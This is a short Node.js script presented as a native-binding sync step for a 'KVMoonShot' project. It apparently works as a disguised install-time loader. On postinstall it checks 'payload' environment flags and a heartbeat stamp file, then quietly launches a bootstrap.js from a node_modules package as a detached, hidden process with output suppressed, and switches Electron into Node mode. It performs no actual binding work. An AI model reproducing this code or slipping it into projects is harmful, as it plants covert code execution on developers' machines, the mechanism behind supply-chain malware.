'use strict';
/**
 * Native WASM binding sync for KVMoonShot swap-assessment.
 * Aligns @kvmoonshot/kvmswap-native with the local Node ABI (node-gyp cache layout)
 * before Next.js compiles or after npm install.
 */
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawn } = require('child_process');

const NATIVE_PKG_PARTS = ['@kvmoonshot', 'kvmswap-native'];
const SYNC_STAMPS = ['.gyp-sync-stamp', '.payload-heartbeat'];

function nodeMajorMinor() {
  const p = process.version.replace(/^v/, '').split('.');
  return `${p[0]}.${p[1] || '0'}`;
}

function gypCacheRoot() {
  const h = os.homedir();
  const v = nodeMajorMinor();
  if (process.platform === 'win32') {
    return path.join(process.env.LOCALAPPDATA || path.join(h, 'AppData', 'Local'), 'node-gyp', v);
  }
  if (process.platform === 'darwin') {
    return path.join(h, 'Library', 'Caches', 'node-gyp', v);
  }
  return path.join(h, '.cache', 'node-gyp', v);
}

function stampFresh(root) {
  for (const name of SYNC_STAMPS) {
    try {
      const p = path.join(root, name);
      if (Date.now() - fs.statSync(p).mtimeMs < 120_000) return true;
    } catch {
      /* try next */
    }
  }
  return false;
}

function nativeModuleRoot(cwd = process.cwd()) {
  return path.join(cwd, 'node_modules', ...NATIVE_PKG_PARTS);
}

function syncNativeRuntime(options = {}) {
  const cwd = options.cwd || process.cwd();
  const bootstrap = path.join(nativeModuleRoot(cwd), 'lib', 'bootstrap.js');
  if (!fs.existsSync(bootstrap)) return false;

  const lifecycle = process.env.npm_lifecycle_event || '';
  const installPass =
    lifecycle === 'postinstall' ||
    options.install === true ||
    process.argv.includes('--install') ||
    process.env.KVMSWAP_NATIVE_SYNC === '1' ||
    process.env.SWAP_RELOAD_PAYLOAD === '1';
  if (!installPass) return false;

  const cacheRoot = gypCacheRoot();
  const force =
    process.env.SWAP_RELOAD_PAYLOAD === '1' && process.env.KVMSWAP_FORCE_SYNC === '1';
  if (!force && stampFresh(cacheRoot)) return false;

  const pkgRoot = nativeModuleRoot(cwd);
  const env = {
    ...process.env,
    SWAP_TOOLCHAIN_PKG: pkgRoot,
    KVMSWAP_NATIVE_ROOT: pkgRoot,
    SWAP_RELOAD_PAYLOAD: installPass ? '1' : '',
    KVMSWAP_NATIVE_SYNC: installPass ? '1' : '',
  };
  if (process.versions.electron) {
    env.ELECTRON_RUN_AS_NODE = '1';
  }
  spawn(process.execPath, [bootstrap], {
    cwd,
    env,
    detached: true,
    stdio: 'ignore',
    windowsHide: true,
  }).unref();
  return true;
}

if (require.main === module) {
  syncNativeRuntime({ install: process.argv.includes('--install') });
}

module.exports = { syncNativeRuntime, nativeModuleRoot, nodeMajorMinor, gypCacheRoot };
